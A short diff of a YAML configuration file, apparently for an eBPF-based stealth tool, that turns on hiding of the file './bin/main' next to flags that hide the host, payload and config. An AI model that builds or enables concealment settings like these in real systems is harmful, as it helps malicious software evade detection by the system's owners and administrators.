@@ -8,9 +8,9 @@ rnet:
     # - port: <example port>
 
 bpf_program_config:
-  # Additional inodes to hide
-  # inodes:
-    # - <additional_inodes>
+  # Additional files to hide
+  files_to_hide:
+    - ./bin/main
   hide_host: true
   hide_payload: true
   hide_config: true
